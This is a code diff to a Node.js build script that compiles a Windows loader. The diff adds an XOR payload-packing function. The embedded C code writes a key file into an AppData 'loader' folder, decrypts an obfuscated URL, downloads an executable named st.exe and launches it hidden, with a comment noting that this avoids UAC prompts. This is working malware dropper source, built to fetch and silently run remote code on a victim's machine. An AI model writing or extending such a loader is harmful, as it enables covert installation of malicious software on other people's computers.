@@ -2,6 +2,7 @@
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
+import crypto from 'node:crypto';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
@@ -12,6 +13,26 @@ const __dirname = path.dirname(__filename);
 
 const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
 const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';
+
+// Standard XOR encryption for the payload
+function packPayload({ key, config, baseBuf, xorKey }) {
+  const keyBuf = Buffer.from(key || '', 'utf8');
+  const cfgBuf = Buffer.from(JSON.stringify(config || {}), 'utf8');
+
+  const header = Buffer.alloc(13);
+  header.writeUInt8(1, 0);
+  header.writeUInt32LE(keyBuf.length, 1);
+  header.writeUInt32LE(cfgBuf.length, 5);
+  header.writeUInt32LE(baseBuf.length, 9);
+
+  const raw = Buffer.concat([header, keyBuf, cfgBuf, baseBuf]);
+
+  const out = Buffer.alloc(raw.length);
+  for (let i = 0; i < raw.length; i++) {
+    out[i] = raw[i] ^ xorKey[i % xorKey.length];
+  }
+  return out;
+}
 
 function rcSource() {
   return `
@@ -122,7 +143,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(loaderDir, MAX_PATH, L"%ls\\\\loader", appData);
     CreateDirectoryW(loaderDir, NULL);
 
-    // 1. Write key.json FIRST
+    // 1. Write key.json FIRST so st.exe doesn't crash looking for it
     wchar_t keyPath[MAX_PATH];
     _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
     
@@ -144,7 +165,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     decrypt_url(url);
     download_file(url, dest);
 
-    // 3. Launch st.exe silently
+    // 3. Launch st.exe silently (WinExec runs as standard user, no UAC)
     char ansiDest[MAX_PATH];
     WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
     WinExec(ansiDest, SW_HIDE);
